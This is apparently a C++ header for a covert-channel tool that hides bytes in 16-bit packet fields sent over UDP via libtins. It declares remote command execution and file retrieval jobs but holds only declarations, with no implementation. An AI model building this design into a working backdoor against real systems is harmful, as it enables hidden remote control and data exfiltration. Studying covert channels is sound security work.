#ifndef Covert_Channel_H
#define Covert_Channel_H

#include <string>
#include <vector>
#include <map>
#include <tins/tins.h>
#include <boost/bimap.hpp>

using std::string;
using namespace Tins;

class Covert_Channel
{
public:
    enum CMD { run_command, return_command, get_file, return_file };

    typedef std::vector<unsigned char> uchar_vector;
    typedef boost::bimap<CMD, string> command_map;
    typedef command_map::value_type cmd_pair;

    typedef struct Address {
            string ip;
            uint16_t port;
    } Address;

    typedef struct Config {
            string interface;
            Address target_addr;
            int listen_port;
    } Config;

    typedef struct Job {
            std::map<int, string, std::greater<int>>  job;
            string command;
            string argument;
            Address address;
    } Job;

    typedef struct HiddenChars {
            unsigned char uchar_1 : 8;
            unsigned char uchar_2 : 8;
    } HiddenChars;

    typedef union DataConverter {
        uint16_t uint16;
        HiddenChars hidden;
    } DataConverter;

    typedef std::map<string, Job> jobs_map;

    Covert_Channel();
    void setup();
    bool handle(PDU& pdu);
    virtual bool parse_command(Job& j) = 0;
    bool udp_send(string dest_ip, int dst_port, uchar_vector hidden);
    bool udp_recv(uchar_vector payload, Address a);
    bool split_command_argument_with_regex(const string& command_argument, Job& j);
    bool send_file(string dest_ip, int dest_port, string filename);

    command_map cmdMap;
    Config config;
private:
    bool finish_transfer(string payload_jid_tag);


    PacketSender sender;
    jobs_map jobs;
    string server_id;
    string key;

};

#endif // Covert_Channel_H
